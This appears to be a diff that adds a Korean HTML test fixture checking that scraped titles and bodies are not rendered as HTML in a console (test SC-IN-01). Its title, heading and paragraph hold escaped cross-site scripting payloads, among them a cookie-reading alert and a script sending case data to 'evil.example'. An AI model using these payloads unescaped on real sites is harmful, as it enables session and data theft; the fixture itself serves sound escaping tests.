@@ -1,0 +1,9 @@
+<!doctype html>
+<html lang="ko">
+<head><meta charset="utf-8"><title>&lt;img src=x onerror=alert('xss')&gt;&lt;script&gt;alert(1)&lt;/script&gt;</title></head>
+<body>
+<!-- 수집한 제목·본문이 콘솔에서 HTML로 해석되지 않는지 확인하는 페이지 (SC-IN-01) -->
+<h1>&lt;script&gt;fetch('/api/v1/cases').then(r=&gt;r.text()).then(t=&gt;navigator.sendBeacon('//evil.example',t))&lt;/script&gt;</h1>
+<p>"&gt;&lt;svg onload=alert(document.cookie)&gt;</p>
+</body>
+</html>
